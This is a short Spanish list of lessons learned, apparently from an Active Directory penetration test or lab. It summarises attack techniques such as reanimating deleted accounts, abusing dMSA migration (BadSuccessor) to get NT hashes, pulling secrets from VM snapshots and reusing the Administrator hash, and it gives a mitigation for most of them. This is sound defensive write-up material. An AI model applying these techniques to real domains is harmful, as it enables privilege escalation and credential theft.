1. **La Papelera de Reciclaje de AD es un vector de escalada subestimado**  
   Reanimar cuentas eliminadas conserva sus contraseñas originales. Auditar los permisos sobre `CN=Deleted Objects` y el derecho `Reanimate-Tombstones`.

2. **Los timestamps de último cambio de contraseña son un oráculo de reutilización**  
   Usar contraseñas iniciales aleatorias y únicas, forzar cambio en el primer login. Las cuentas creadas en lote deben tener contraseñas diferentes.

3. **El supply chain en VS Code es realista y efectivo**  
   Los shares usados como drop zones de extensiones son un vector de ataque. Firmar extensiones y verificar integridad antes de instalarlas.

4. **BadSuccessor (dMSA) es crítico en WS2025**  
   La migración de dMSA permite obtener el NT hash de cuentas heredadas con solo `CreateChild` + `GenericWrite`. Aplicar KB5063880 o superior.

5. **El análisis forense de VMs es una técnica de exfiltración eficiente**  
   Las snapshots contienen hashes, tickets y secretos. Proteger los backups de VM con los mismos controles que los backups de AD.

6. **La reutilización del hash del Administrator es catastrófica**  
   Un solo backup comprometido otorga acceso a todo el dominio. Cada cuenta debe tener contraseña única y la del Administrator debe rotarse periódicamente.

7. **"Administrator" no es el único Domain Admin**  
   BloodHound reveló que `max.palmer` también es Domain Admin. Siempre hay que enumerar el grupo y probar todos sus miembros.

8. **El clock skew es un problema crítico en AD**  
   Un desfase > 5 minutos invalida los tickets Kerberos. Sincronizar la hora antes de usar Kerberos.

9. **LDAP signing puede obstaculizar BloodHound**  
   Si está habilitado, usar Kerberos (`-k`) o TLS. Los atacantes adaptan sus herramientas a las restricciones del entorno.
